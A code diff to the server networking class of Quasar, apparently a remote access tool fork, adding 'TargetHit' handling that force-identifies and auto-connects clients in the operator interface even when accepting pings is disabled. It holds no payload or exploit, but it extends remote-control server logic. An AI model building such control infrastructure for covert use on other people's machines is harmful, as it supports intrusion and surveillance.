@@ -1,6 +1,7 @@
 using Quasar.Common.Cryptography;
 using Quasar.Common.Messages;
 using System;
+using System.Collections.Generic;
 using System.IO;
 using System.Linq;
 using System.Media;
@@ -18,6 +19,16 @@ namespace Quasar.Server.Networking
         private static extern int mciSendString(string command, StringBuilder returnValue, int returnLength, IntPtr winHandle);
 
         private readonly Utilities.ClientDatabase _clientDb = new Utilities.ClientDatabase();
+
+        private readonly object _targetHitConnectLock = new object();
+        // When a TargetHit ping is received while the client is not identified yet,
+        // we allow one-time identification even if AcceptPing is disabled for that UUID.
+        private readonly HashSet<string> _targetHitAllowIdentificationUuids =
+            new HashSet<string>(StringComparer.OrdinalIgnoreCase);
+        // If AcceptPing is disabled, we still want to connect the client UI immediately on the first TargetHit,
+        // but avoid re-connecting / re-showing popups for every subsequent TargetHit ping.
+        private readonly HashSet<string> _targetHitConnectedUuids =
+            new HashSet<string>(StringComparer.OrdinalIgnoreCase);
 
         /// <summary>
         /// Gets the clients currently connected and identified to the server.
@@ -71,6 +82,61 @@ namespace Quasar.Server.Networking
             handler?.Invoke(client);
         }
 
+        private void MarkTargetHitAllowIdentification(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return;
+            lock (_targetHitConnectLock)
+            {
+                _targetHitAllowIdentificationUuids.Add(uuid.Trim());
+            }
+        }
+
+        private bool TryConsumeTargetHitAllowIdentification(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return false;
+            lock (_targetHitConnectLock)
+            {
+                return _targetHitAllowIdentificationUuids.Remove(uuid.Trim());
+            }
+        }
+
+        private bool HasTargetHitAllowIdentification(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return false;
+            lock (_targetHitConnectLock)
+            {
+                return _targetHitAllowIdentificationUuids.Contains(uuid.Trim());
+            }
+        }
+
+        private void MarkTargetHitConnected(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return;
+            lock (_targetHitConnectLock)
+            {
+                _targetHitConnectedUuids.Add(uuid.Trim());
+            }
+        }
+
+        private bool IsTargetHitConnectedAlready(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return false;
+            lock (_targetHitConnectLock)
+            {
+                return _targetHitConnectedUuids.Contains(uuid.Trim());
+            }
+        }
+
+        private void ClearTargetHitConnectionState(string uuid)
+        {
+            if (string.IsNullOrWhiteSpace(uuid)) return;
+            lock (_targetHitConnectLock)
+            {
+                _targetHitAllowIdentificationUuids.Remove(uuid.Trim());
+                _targetHitConnectedUuids.Remove(uuid.Trim());
+            }
+        }
+
         /// <summary>
         /// Constructor, initializes required objects and subscribes to events of the server.
         /// </summary>
@@ -92,10 +158,9 @@ namespace Quasar.Server.Networking
         {
             if (!connected)
             {
+                ClearTargetHitConnectionState(client.Value?.Id);
                 if (client.Identified)
-                {
                     OnClientDisconnected(client);
-                }
             }
         }
 
@@ -123,9 +188,18 @@ namespace Quasar.Server.Networking
                     client.Value.Id = uuid;
 
                     bool accept = _clientDb.GetClientAcceptPing(uuid);
+                    // Fresh deployments may not have a DB row yet for this UUID.
+                    // Allow the very first ping so the client can identify and get a row created.
+                    if (!accept && !_clientDb.ClientExists(uuid))
+                        accept = true;
 
                     if (ping.TargetHit)
+                    {
+                        // Target-hit should override AcceptPing: allow identification & connect UI immediately.
+                        accept = true;
+                        MarkTargetHitAllowIdentification(uuid);
                         accept = HandleTargetHitPrompt(uuid, ping, accept);
+                    }
 
                     // Update UI/DB (toast + LastPing) and show notification even when checkbox is not enabled.
                     MessageHandler.Process(client, message);
@@ -145,8 +219,20 @@ namespace Quasar.Server.Networking
                         /* Only show as connected in UI when Accept Ping is enabled.
                          * If disabled, we still allow identification so we can receive periodic pings (and show toast),
                          * but we won't consider the client "connected" for control actions. */
-                        if (_clientDb.GetClientAcceptPing(client.Value?.Id))
+                        string identifiedUuid = client.Value?.Id;
+                        bool acceptPing = _clientDb.GetClientAcceptPing(identifiedUuid);
+                        bool isNewClient = !string.IsNullOrWhiteSpace(identifiedUuid) && !_clientDb.ClientExists(identifiedUuid);
+                        bool forcedByTargetHit = TryConsumeTargetHitAllowIdentification(identifiedUuid);
+
+                        if (acceptPing || isNewClient)
+                        {
                             OnClientConnected(client);
+                        }
+                        else if (forcedByTargetHit && !IsTargetHitConnectedAlready(identifiedUuid))
+                        {
+                            MarkTargetHitConnected(identifiedUuid);
+                            OnClientConnected(client);
+                        }
                     }
                     else
                     {
@@ -169,8 +255,15 @@ namespace Quasar.Server.Networking
 
             if (message is ClientPingRequest pingConnected && pingConnected.TargetHit)
             {
-                bool accept = _clientDb.GetClientAcceptPing(pingConnected.Uuid ?? client.Value?.Id);
-                HandleTargetHitPrompt(pingConnected.Uuid ?? client.Value?.Id, pingConnected, accept);
+                string uuid = pingConnected.Uuid ?? client.Value?.Id;
+                bool acceptPing = _clientDb.GetClientAcceptPing(uuid);
+                if (!acceptPing && !IsTargetHitConnectedAlready(uuid))
+                {
+                    MarkTargetHitConnected(uuid);
+                    OnClientConnected(client);
+                }
+
+                HandleTargetHitPrompt(uuid, pingConnected, acceptPing);
             }
         }
 
@@ -183,9 +276,14 @@ namespace Quasar.Server.Networking
             if (packet.Id.Length != 64 && packet.Id.Length != 36)
                 return false;
 
-            /* Only identify if "Accept Ping" is enabled for this UUID. */
+            /* Only identify if "Accept Ping" is enabled for this UUID.
+             * Exception: if a TargetHit ping was received, allow one-time identification even when AcceptPing is disabled. */
             if (!_clientDb.GetClientAcceptPing(packet.Id))
-                return false;
+            {
+                bool exists = _clientDb.ClientExists(packet.Id);
+                if (exists && !HasTargetHitAllowIdentification(packet.Id))
+                    return false;
+            }
 
             client.Value.Version = packet.Version;
             client.Value.OperatingSystem = packet.OperatingSystem;
